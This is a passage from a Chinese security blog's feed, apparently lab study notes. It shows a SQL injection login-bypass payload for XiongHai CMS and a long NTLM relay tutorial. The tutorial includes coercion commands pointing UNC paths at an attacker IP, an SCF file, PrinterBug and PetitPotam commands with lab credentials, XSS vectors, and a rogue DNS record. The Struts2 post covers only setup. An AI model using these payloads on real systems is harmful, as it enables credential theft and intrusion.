invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看这里没有转义那就肯定有sql注入了，可以看一下他的校验逻辑，查询指定用户然后从数据库中获取他的密码，与我们的密码md5之后进行比较，若相等则登陆成功</p><p>那这里我就采用了联合注入，然后输入密码为1，查询的值为1的md5，最终成功绕过</p><blockquote><p>不过字段数需要尝试一下，这里试出来是有8个</p></blockquote><p>最终payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user=-1&#x27; union select 1,1,1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot;,1,1,1,1#&amp;password=1&amp;checkbox=1&amp;login=yes<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151712210.png" alt="image-20240524003328983"></p><p>而且身份竟然是admin，这里还没看出为什么突然就admin了，源码好像没看到相关的</p><p><img src="http://cdn.clown2024.cn/202407151712211.png" alt="image-20240524003529583"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;环境安装&quot;&gt;环境安装&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;来审一下这个简单cms学习一下，熊海cms直接网上找就可以&lt;/p&gt;
&lt;p&gt;采用phpstudy进行配置，然后要提前建立一个数据，他不会自动帮你建&lt;/p&gt;
&lt;p&gt;安装好后首页就是这样的&lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="代码审计" scheme="https://clowsman.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://clowsman.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透体系建设-NTLM中继专题</title>
    <link href="https://clowsman.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/"/>
    <id>https://clowsman.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-NTLM%E4%B8%AD%E7%BB%A7%E4%B8%93%E9%A2%98/</id>
    <published>2024-05-16T15:34:05.000Z</published>
    <updated>2024-07-15T06:47:03.876Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ntlm协议">NTLM协议</span></h1><p>NTLM(NT LAN Manager)是一套 Windows 安全协议，旨在为用户提供具有完整性和机密性的身份验证。</p><p>NTLM 是基于质询&#x2F;应答模式的身份验证协议，其过程是加密的，验证过程中不会通过网络传输用户的明文密码。</p><p>NTLM验证的加密算法为NTLM Hash，用于用户明文密码的加密，其计算的哈希值存储在本地的SAM文件中，域内用户的哈希值存储在域控的NTDS.dit文件中。</p><p>本地用户登录验证时，就是将输入的密码转化为NTLM Hash然后与SAM文件中的NTLM Hash比较。</p><p>文件中存储的哈希值格式类似如下：</p><p><img src="http://cdn.clown2024.cn/202407151446349.png" alt="image-20240517104232456"></p><p>上图有两个哈希，第一个是LM Hash，第二个是NTLM Hash。</p><p>LM Hash 是 LM(LAN Manager)验证机制的加密算法。LM 是在 NTLM 出现之前Windows 使用的验证机制。LM 自身存在的缺陷使得LM Hash 加密强度不高，以至很容易被破解，所以 LM 逐渐被 NTLM 所淘汰。NTLM有 NTLM v1、NTLM v2、NTLM v2Session 三个版本，目前使用最多的是 NTLM v2 版本。</p><h1><span id="ntlm认证机制">NTLM认证机制</span></h1><h2><span id="ntlm在工作组环境的认证">NTLM在工作组环境的认证</span></h2><p>NTLM采用了一种一种基于质询&#x2F;应答模式的身份验证机制，认证过程会产生三种类型的消息：</p><p>TYPE1，协商(Negotiate);TYPE 2，质询(Challenge);TYPE 3，身份验证(Authenticate)</p><p><img src="http://cdn.clown2024.cn/202407151446350.png" alt="image-20240517103005341"></p><p>具体过程：</p><ol><li>当客户端要访问服务器上某个受保护的服务时，需要输入服务器的用户名和密码进行验证。此时客户端会在本地缓存一份服务器密码的 NTLM Hash，然后向服务器发送TYPE1Negotiate 消息。该消息中包含一个以明文表示的用户名以及其他协商信息，如需要认证的主体和需要使用的服务等。</li><li>服务器收到客户端发送的 TYPE1消息后，先判断本地账户中是否有 TYPE1消息中的用户名。如果有,服务器就会选出自己能够支持和提供的服务内容,生成并回复 TYPE2 Challenge 消息。该消息中包含了一个由服务端生成的 16 位随机值 Challenge，服务器也会在本地缓存该值。</li><li>客户端收到 TYPE 2消息后，会使用步骤1中缓存的服务器的 NTLM Hash 对Challenge 进行加密并生成Response，然后将Response、用户名和Challenge 等组合得到 Net-NTLM Hash，再将 Net-NTLM Hash 封装到 TYPE3 Authenticate 消息中发往服务器。</li><li>服务器在收到 TYPE3消息后,用自己密码的NTLMHash对 Challenge 进行加密并比较自己计算的 Response 与客户端发送的 Response 是否一致。如果一致，就证明客户端掌握了服务器的密码，认证成功，否则认证失败。</li></ol><h2><span id="ntlm在域环境的认证">NTLM在域环境的认证</span></h2><p>域环境中，域用户的哈希值都存储在域控的NTDS.dit中，服务器本身无法计算Response消息，因此需要和域控建立一个安全通道，并通过域控完成最终的认证流程。</p><p><img src="http://cdn.clown2024.cn/202407151446351.png" alt="image-20240517141109345"></p><ol><li>域用户输入自己的账号密码登录客户端主机时，客户端会将用户输入的密码转换为NTLM Hash缓存，当用户想访问某台服务器的服务时，就会发送TYPE1 Negotiate消息</li><li>同工作组环境中的认证</li><li>同工作组环境中的认证</li><li>服务器收到TYPE3 消息之后会转发给域控</li><li>域控根据TYPE3消息获取对应用户的本地存储NTLM Hash，然后对原始Challenge计算生成Response，然后和TYPE3消息中的Response比对</li><li>服务器根据域控返回的验证结果，对客户端进行回复</li></ol><h2><span id="net-ntlm-hash">Net-NTLM Hash</span></h2><h3><span id="net-ntlm-hash组成">Net-NTLM Hash组成</span></h3><p>Net-NTLM Hash是上面TYPE3消息中包含的，是在网络环境下NTLM认证的哈希值。在NTLM  v1和NTLM v2中，Net-NTLM Hash也可以分为v1和v2两个版本，构成如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># Net-NTLM Hash v1<br>uername::hostname::LM response:NTLM response:challenge<br># Net-NTLM Hash v2<br>username::domain:challenge:HMAC-MD5:blob<br></code></pre></td></tr></table></figure><p>可以从NTLM认证的数据包中提取Net-NTLM Hash，下面是Net-NTLM Hash v2的提取过程</p><ol><li><p>从TYPE 2 消息的数据包中提取得到Challenge</p><p><img src="http://cdn.clown2024.cn/202407151446352.png" alt="image-20240517154219376"></p></li><li><p>HMAC-MD5对应TYPE3数据包中的NTProofStr</p><p><img src="http://cdn.clown2024.cn/202407151446353.png" alt="image-20240517154324541"></p></li><li><p>User name和Domain在TYPE3数据包中都可以找到，blob为数据包中的Response减去NTProofStr后剩下的部分</p><p><img src="http://cdn.clown2024.cn/202407151446354.png" alt="image-20240517154720777"></p></li><li><p>再根据Net-NTLM Hash v2的构成将上面的数据组合起来即可</p><p><img src="http://cdn.clown2024.cn/202407151446355.png" alt="image-20240517154802759"></p></li></ol><h3><span id="net-ntlm-hash利用">Net-NTLM Hash利用</span></h3><p>实战中可以通过中间人的方法截获认证请求获得Net-NTLM Hash，然后可以暴力破解并获得客户端用户的明文密码。</p><p>这里有另一种利用方法，<strong>NTLM Relay</strong>。</p><p>NTLM Relay攻击就是通过中间人对NTLM认证过程的流量进行转发，从而允许中间人使用客户端的身份认证服务，过程如图所示：</p><p><img src="http://cdn.clown2024.cn/202407151446356.png" alt="image-20240517155502009"></p><p>要实现该过程，要先解决如何触发客户端向Attacker发起NTLM认证请求，其次要决定将客户端的请求拦截后认证到什么样的服务。</p><h1><span id="发起并截获ntlm请求">发起并截获NTLM请求</span></h1><p>NTLM 是一种嵌入式协议，消息的传输依赖使用 NTLM 进行认证的上层协议，如SMB、LDAP、HTTP、MSSQL 等。因此，只要是使用这些协议的应用程序都可以要求用户发起 NTLM 请求。测试人员可通过 Responder 等工具对用户的 NTLM 认证请求进行拦截，并获取其 Net-NTLM Hash。</p><p>Responder 是一款可以在局域网模拟各种服务器(SMB、LDAP、HTTP、MSSQL、WPAD、FTP、POP3、IMAP、SMTP)进行中间人攻击的工具，当用户连接这些服务器时，该工具将截获用户的认证请求，如图所示：</p><p><img src="http://cdn.clown2024.cn/202407151446357.png" alt="image-20240517160601855"></p><p><img src="http://cdn.clown2024.cn/202407151446358.png" alt="image-20240517160627078"></p><blockquote><p>kali中已经默认安装了responder可以直接使用，需要root权限运行</p></blockquote><h2><span id="ntlm攻击常用方法">NTLM攻击常用方法</span></h2><p>在Windows中，通过设置指向恶意服务器的UNC路径，能够使受害机器自动使用当前用户凭证向恶意服务器发起NTLM认证</p><h3><span id="系统命令">系统命令</span></h3><p>很多系统命令都可以传入UNC路径，这里列举常用的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">net use \\10.10.10.147\share<br><span class="hljs-built_in">dir</span> \\10.10.10.147\share<br>attrib \\10.10.10.147\share<br>bcdboot \\10.10.10.147\share<br>bdeunlock \\10.10.10.147\share<br>cacls \\10.10.10.147\share<br>certreq \\10.10.10.147\share<br>certutil \\10.10.10.147\share<br>cipher \\10.10.10.147\share<br>ClipUp -l \\10.10.10.147\share<br>cmdl32 \\10.10.10.147\share<br>cmstp /s \\10.10.10.147\share<br>colorcpl \\10.10.10.147\share<br>comp /N=0 \\10.10.10.147\share<br>compact \\10.10.10.147\share<br>control \\10.10.10.147\share<br>Defrag \\10.10.10.147\share<br>diskperf \\10.10.10.147\share<br>dispdiag -out \\10.10.10.147\share<br>doskey /MACROFILE=\\10.10.10.147\share<br>esentutl /k \\10.10.10.147\share<br><span class="hljs-built_in">expand</span> \\10.10.10.147\share<br>extract32 \\10.10.10.147\share<br>FileHistory \\10.10.10.147\share<br>findstr * \\10.10.10.147\share<br>fontview \\10.10.10.147\share<br>fvenotify \\10.10.10.147\share<br>FXSCOVER \\10.10.10.147\share<br>hwrcomp -check \\10.10.10.147\share<br>hwrreg \\10.10.10.147\share<br>icacls \\10.10.10.147\share<br>licensingdiag -cab \\10.10.10.147\share<br>lodctr \\10.10.10.147\share<br>lpksetup /p \\10.10.10.147\share /s<br>makecab \\10.10.10.147\share<br>msiexec /update \\10.10.10.147\share /quiet<br>msinfo32 \\10.10.10.147\share<br>mspaint \\10.10.10.147\share<br>msra /openfile \\10.10.10.147\share<br>mstsc \\10.10.10.147\share<br>netcfg -l \\10.10.10.147\share -c p -i foo<br></code></pre></td></tr></table></figure><p>这里用net use命令来测试一下</p><p><img src="http://cdn.clown2024.cn/202407151446359.png" alt="image-20240517162021631"></p><p><img src="http://cdn.clown2024.cn/202407151446360.png" alt="image-20240517162105436"></p><p>我们这里成功截获到了Net-NTLM Hash v2</p><h3><span id="desktopini文件">Desktop.ini文件</span></h3><p>Windows系统文件夹下有一个隐藏文件 desktop.ini,用来指定和存储文件夹图标之类的个性化设置</p><p>如图，desktop.ini中的IconResource为文件夹的图标路径，可以改为UNC路径并指向恶意服务器。当用户访问该文件夹时将自动请求恶意服务器上的图标资源，Responder即可截获用户的Net-NTLM Hash</p><p><img src="http://cdn.clown2024.cn/202407151446361.png" alt="image-20240517163327639"></p><p><img src="http://cdn.clown2024.cn/202407151446362.png" alt="image-20240517163336432"></p><p><img src="http://cdn.clown2024.cn/202407151446363.png" alt="image-20240517163408543"></p><p>我们测试的时候可以新建一个文件夹，然后修改改文件夹为随便一个图标就会出现desktop.ini文件，然后就可以修改了(要把隐藏重要系统文件关掉才会出现)</p><blockquote><p>我自己测试的时候复现失败了不知道为什么</p></blockquote><h3><span id="scf文件">SCF文件</span></h3><p>SCF 文件是 Windows 文件资源管理器命令文件，也是一种可执行文件。该文件中的IconFile 属性可以指定 UNC 路径，Windows 文件资源管理器将尝试加载 IconFile 属性指定的文件图标。</p><p>在一个文件夹下新建一个test.scf文件，写入下面内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[Shell]<br>Command=2<br>IconFile=\\192.168.20.128\share\test.ico<br>[Taskbar]<br>Command=TogleDesktop<br></code></pre></td></tr></table></figure><p>然后访问文件夹即可截获</p><blockquote><p>这里也复现失败了奇怪了</p></blockquote><h3><span id="pdf文件">PDF文件</span></h3><p>PDF 规范允许为 GoTobe 和 GoTOR条目加载远程内容。测试人员可以在 PDF 文件中插入 UNC 路径，当用户通过 PDF 阅读器(Adobe Reader)打开 PDF 文档时，将向恶意服务器发起 NTLM 认证请求。</p><p>相关利用工具有Bad-PDF和Worse-PDF</p><p>以badpdf为例</p><p><img src="http://cdn.clown2024.cn/202407151446364.png" alt="image-20240517174014128"></p><p>然后将生成的test.pdf上传到受害机，用Adobe Reader打开文件后，而已服务器就会截获用户的Net-NTLM Hash。emmm但是感觉适用面有点窄，只有Adobe Reader打开才发起NTLM请求，正常浏览器打开无事发生。</p><p>而且多年前就出现补丁了感觉基本没用了属于是</p><h3><span id="office文档">Office文档</span></h3><p>Office 文档的 document.xml.rels 文件可以插入 UNC 路径，并向 UNC 地址指定的服务器发起 NTLM 请求。</p><p>制作流程如下：</p><ol><li><p>新建一个Word文档，任意插入一张图片后保存，用压缩软件打开</p></li><li><p>在word&#x2F;_rels下找到document.xml.rels文件，找到刚才插入图片对应的Target参数，将其修改为指向而已服务器的UNC路径，并加上TargetMode&#x3D;”External”属性</p><p><img src="http://cdn.clown2024.cn/202407151446365.png" alt="image-20240517175701097"></p><p><img src="http://cdn.clown2024.cn/202407151446366.png" alt="image-20240517175820073"></p></li><li><p>将该文件上传到受害机器，文件被打开后就可以截获到Net-NTLM Hash</p></li></ol><blockquote><p>难绷又复现失败了。。。不知道是不是只适合旧版本的office</p></blockquote><h3><span id="privexchange漏洞">PrivExchange漏洞</span></h3><p>Microsoft Exchange 允许任意关联了Exchange 邮箱的用户通过EWS接口来创建一个推送订阅(Push Subscription)，并可以指定任意 URL 作为通知推送的目的地。</p><p>当触发通知推送时，Exchange 将使用 CredentialCache.DefaultCredentials 发出 HTTP 请求，并以机器账户的身份发起 NTLM 认证。该漏洞本质是一个 SSRF。</p><p>具体的使用可以网上找POC验证。</p><h3><span id="printerbug漏洞">PrinterBug漏洞</span></h3><p>Windows 中的MS-RPRN(Print System Remote Protocol，打印系统远程协议)用于打印客户端和打印服务器之间的通信，支持客户端和服务器之间的同步打印和联机操作包括打印任务控制、打印系统管理。</p><p>MS-RPRN 中定义的RpcRemoteFindFirstPrinterChangeNotification API可以创建远程修改通知对象，用于监控对打印机对象的修改，并向打印客户端发送修改通知。任何具备域用户权限的测试人员都可以滥用该方法来强迫运行打印服务(PrintSpooler)的主机向恶意服务器发起 Kerberos 或 NTLM 身份认证请求。并且，由于 Print Spooler 服务以NTAUTHORITY\SYSTEM 账户的身份运行,因此最终通过 Responder 截获的是目标机器账户的 Net-NTMLHash。微软并不承认这是一个洞，所以未进行任何修复。</p><p>相关利用工具有SpoolSample.exe和Printerbug.py，开启Responder监听后，执行下面命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python printerbug.py hack-my.com/Marcus:Marcus\@123@10.10.10.20 10.10.10.147<br></code></pre></td></tr></table></figure><p>通过 printerbug·py 连接到受害机器(10.10.10.20)，以迫使它向测试人员所控的恶意服务器(10.10.10.147)发起 NTLM 认证。Responder 上成功截获受害机器的 Net-NTML Hash</p><p><img src="http://cdn.clown2024.cn/202407151446367.png" alt="image-20240517183241095"></p><h3><span id="petitpotam漏洞">PetitPotam漏洞</span></h3><p>当Print Spooler服务被关闭后，PrinterBug漏洞就无法利用，该漏洞可以用于替代PrinterBug方法。</p><p>MS-EFSR中有一组API，可通过FileName参数指定UNC 路径。例如，EfsRpcOpenFileRaw API的语法格式如下，可以打开服务器上的加密对象进行备份或还原。</p><p><img src="http://cdn.clown2024.cn/202407151446369.png" alt="image-20240517183953529"></p><p>PetitPotam就是通过利用这些API来向恶意服务器发起NTLM认证请求，然后截获Net-NTLM Hash</p><p>与PrinterBug一样，PetitPotam也需要有一个域用户权限。</p><p>注意，在 Windows Server 2008&#x2F;2012 上，由于可匿名访问的命名管道默认不为空，因此导致可以匿名触发。</p><p>开启监听执行下面命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python PetitPotam.py -d hack-my.com -u Marcus -p Marcus\@123 10.10.10.147 10.10.10.20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151446370.png" alt="image-20240517184536531"></p><h2><span id="常见web漏洞利用">常见Web漏洞利用</span></h2><h3><span id="xss">XSS</span></h3><p><strong>构造UNC路径，触发SMB请求并向恶意服务器发起NTLM认证</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"># 使用于<span class="hljs-variable constant_">IE</span>浏览器<br>&lt;scripts src=<span class="hljs-string">&quot;\\10.10.10.147\xss&quot;</span>&gt;&lt;/script&gt;<br># 借助<span class="hljs-variable constant_">LLMNR</span>/<span class="hljs-variable constant_">NBNS</span>，适用于<span class="hljs-variable constant_">IE</span>和<span class="hljs-title class_">Edge</span>浏览器<br>&lt;scripts src=<span class="hljs-string">&quot;\\UnknownName\xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><blockquote><p>LLMNR（Link-Local Multicast Name Resolution）和NBNS（NetBIOS Name Service）是两种网络服务协议，它们用于在局域网（LAN）中解析主机名到IP地址。</p></blockquote><ul><li><p>LLMNR是微软开发的一个基于IPv6的名称解析服务，用于在没有DNS服务器的情况下解析本地网络上的主机名。</p></li><li><p>它使用IPv6的链路本地地址作为通信媒介，通过发送多播消息来解析主机名。</p></li><li><p>LLMNR通常用于小型网络或家庭网络，其中可能没有配置DNS服务器。</p></li><li><p>NBNS是NetBIOS（Network Basic Input&#x2F;Output System）名称服务的缩写，是早期Windows网络中用于名称解析的一个服务。</p></li><li><p>NBNS使用NetBIOS协议，通过广播或多播消息来解析网络上的NetBIOS名称到IP地址。</p></li><li><p>NBNS主要用于基于NetBIOS的网络，如Windows NT和早期的Windows版本。</p></li></ul><p><strong>构造http路径，通过http向恶意服务器发起NTLM认证请求</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;scripts src=<span class="hljs-string">&quot;//10.10.10.147/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在Microsoft Edge等浏览器中存在信任区域(Trusted Zones)，其中包括互联网(Internet)、本地内部网(Local Internet)、受信任的站点(Trusted Sites)和受限制的站点(Restricted Sites)这几个区域</p><p><img src="http://cdn.clown2024.cn/202407151446371.png" alt="image-20240528233328349"></p><p>每个区域都对应不同的安全等级，并关联不同的限制条件。</p><p>默认情况下，只有当某站点的域名在本地内部网(Local Intranet)或受信任的站点(Trusted Sites)列表中时，浏览器才会自动使用当前计算机已登录的用户名和密码进行NTLM 认证；其余情况都需要用户手动输入身份进行验证。</p><p>通常，许多组织将企业子域名所托管的所有数据标记为可信数据。</p><p><img src="http://cdn.clown2024.cn/202407151446372.png" alt="image-20240528233641528"></p><p>*.hack-my.com 位于白名单中，那么测试人员只需要获取*.hack-my.com 下的某台服务器使用该服务器启动 Responder 监听，就可以让浏览器自动以登录用户的凭据发起 NTLM认证</p><p>因此我们可以Powermad项目的Invoke-DNSUpdate.ps1脚本可用来向域内添加一条新的 DNS 记录，由于域内的成员默认具有添加 DNS 的权限，因此可以通过该脚本为运行 Responder 的服务器注册一个子域名，如evil.hack-my.com</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Import-Module .、InvokeDNSUpdate.ps1<br>Invoke-DNSUpdate -DNSType A -DNSName evil.hack-my.com -DNSData 10.10.10.147<br></code></pre></td></tr></table></figure><p>然后xss攻击向量修改成这样即可截获NTLM认证</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&lt;scripts src=<span class="hljs-string">&quot;//evil.hack-my.com/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3><span id="file-inclusion">File Inclusion</span></h3><p>在 Windows 下，PHP 的常见文件包含文件读取类函数，可以解析 UNC 网络路径</p><p>如果网站存在 XXE、SSRF 等漏洞，都可以通过指定网络路径(UNC 或 HTTP)，尝试触发 NTLM 请求。</p><h3><span id="sql注入">SQL注入</span></h3><p>在 Windows 下安装的 MySQL 数据库中，load_file、into dumpfile等常见操作均支持UNC 路径</p><p><img src="http://cdn.clown2024.cn/202407151446373.png" alt="image-20240528234420733"></p><p>mysql的前提是要拥有相关操作的权限，并且没有secure_file_priv的限制</p><p>对应SQL Server数据库，通过调用xp_dirtree等存储过程可以发起NTLM请求：</p><p><img src="http://cdn.clown2024.cn/202407151446374.png" alt="image-20240528234602866"></p><h2><span id="llmnrx2fnbns欺骗利用">LLMNR&#x2F;NBNS欺骗利用</span></h2><p>LLMNR(Link-Local Multicast Name Resolution,链路本地多播名称解析)是一个基于协议的域名系统(DNS)数据包的格式，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。</p><p>NBNS 的全称为 NetBIOS Name Service，用于在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。几乎所有局域网都是在NetBIOS协议的基础上工作的，操作系统可以利用 WINS 服务、广播和 Lmhost 文件等，以将NetBIOS名称解析到相应的IP 地址。</p><p>当一台主机要访问另一台主机时，会先在自己本地名称缓存中查询目标主机的名称。如果在本地缓存中没有找到对应的名称，那么主机会向 DNS 服务器发送查询请求。如果主机没有收到响应或收到了错误的信息，那么主机会使用 LLMNR 或 NBNS 分别向局域网内发送 UDP 多播或广播请求，以查询对应的主机名。局域网的其他主机在收到这个查询请求后，会将被查询的名称与自己的主机名进行比较。如果与自己的主机名一致，就回复一条包含了自己 IP 地址的单播响应给发出该査询请求的主机，否则丢弃之。</p><p>那么测试人员就可以在该过程中使用中间人攻击，当合法主机输入不存在或者错误的主机名，测试人员就可以代替这个主机进行回复，并通过Responder等工具要求受害机器发起NTLM身份验证。</p><h1><span id="中继到smb利用">中继到SMB利用</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ntlm协议&quot;&gt;NTLM协议&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;NTLM(NT LAN Manager)是一套 Windows 安全协议，旨在为用户提供具有完整性和机密性的身份验证。&lt;/p&gt;
&lt;p&gt;NTLM 是基于质询&amp;#x2F;应答模式的身份验证协议，其过</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Struts2漏洞学习</title>
    <link href="https://clowsman.github.io/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-10T08:40:37.000Z</published>
    <updated>2024-07-15T06:44:39.834Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="struts2介绍">Struts2介绍</span></h1><p>Struts2是以MVC架构为基础的WEB框架，通过WEB Filter的方式内嵌在WEB服务器中进行使用，他对servlet进行了封装。</p><p>Struts2与Struts1关系：Struts2是Struts的下一代产品，是在Struts1和WebWork的技术基础上进行了合并的全新的Struts2框架<br>其全新的Struts2的体系结构与Struts1的体系结构差别巨大。</p><p>Struts2以WebWork为核心</p><p>Struts2&#x3D;Struts1+WebWork</p><p>Struts2是Apache的产品。</p><p>Struts2是一个标准的MVC框架。JAVAWEB中的model2模式就是一个MVC模式。model2&#x3D;Servlet+jsp+JavaBean</p><p>Struts2框架是在JAVAWEB开发中使用的。<br>使用Struts2框架，可以简化我们的web开发，并且降低程序的耦合度。</p><p>类似于Struts2框架的产品：Struts1、webwork、jsf（Sun提供）、SpringMVC都是MVC模式</p><h1><span id="struts2环境配置">Struts2环境配置</span></h1><p>这里采用maven添加依赖的方式配置</p><p>这里选了一个最低版本的方便漏洞测试</p><p><img src="http://cdn.clown2024.cn/202407151444306.png" alt="image-20240510165534126"></p><p>可以安装一个struts2插件方便高亮显示</p><p><img src="http://cdn.clown2024.cn/202407151444307.png" alt="image-20240510165817113"></p><p>配置web.xml的过滤器和映射,配置可以参考官网：<a href="https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%8D%E4%B8%80%E6%A0%B7%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E9%80%89%E6%8B%A9%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E4%BB%8E%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E7%BB%99%E7%9A%84%E7%A4%BA%E4%BE%8Bwar%E5%8C%85%E4%B8%AD%E7%9A%84WEB-INF%E4%B8%8B%E7%9A%84web.xml%E6%9D%A5%E5%8F%82%E8%80%83">https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application，不过过滤器可能不同版本的框架不一样需要自己选择，还可以从项目源码给的示例war包中的WEB-INF下的web.xml来参考</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Basic Struts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444308.png" alt="image-20240510190214572"></p><p>解释一下各标签的含义，配得比较少顺便记录一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;display-name&gt;：这是一个可选的标签，用于为 Web 应用提供一个显示名称。这个名称通常在部署时或通过应用服务器的管理界面展示。<br>&lt;filter&gt;：定义一个过滤器，它是 Java Servlet 规范的一部分，用于拦截进入 Servlet 容器的请求和响应。<br><br>&lt;filter-name&gt;：为过滤器指定一个名称，这里名称为 struts2。这个名称在整个应用中应该是唯一的，并且在后面定义 &lt;filter-mapping&gt; 时会被引用。<br>&lt;filter-class&gt;：指定过滤器的完整类名。在这个例子中，org.apache.struts2.dispatcher.FilterDispatcher 是 Struts2 框架的核心过滤器类，它负责拦截请求并分派给相应的 Action 对象处理。<br><br>&lt;filter-mapping&gt;：定义如何将过滤器映射到 Servlet 容器中的 URL 请求上。<br><br>&lt;filter-name&gt;：指定上面定义的过滤器的名称，这里引用了 struts2 过滤器。<br>&lt;url-pattern&gt;：定义过滤器将被应用于哪些 URL 请求。/* 是一个通配符，表示所有的 URL 请求都将被 struts2 过滤器处理。<br><br>&lt;welcome-file-list&gt;：定义应用的欢迎文件，当用户访问应用的根目录而没有指定具体页面时，Servlet 容器将提供这些文件。<br><br>&lt;welcome-file&gt;：指定欢迎文件的名称，这里为 index.jsp。这意味着当用户访问应用的根 URL 时，如 http://localhost:8080/YourApp/，Servlet 容器将自动提供 index.jsp 页面。<br></code></pre></td></tr></table></figure><p>然后就是自己添加一个struts2.xml用来指定 URL、Java 类和视图页面（例如<code>index.jsp</code>）之间的关系，这里也参考上面官网的配置，文件路径为<code>src/main/resources</code>，dtd文件的版本也要和自己的框架版本对应</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span 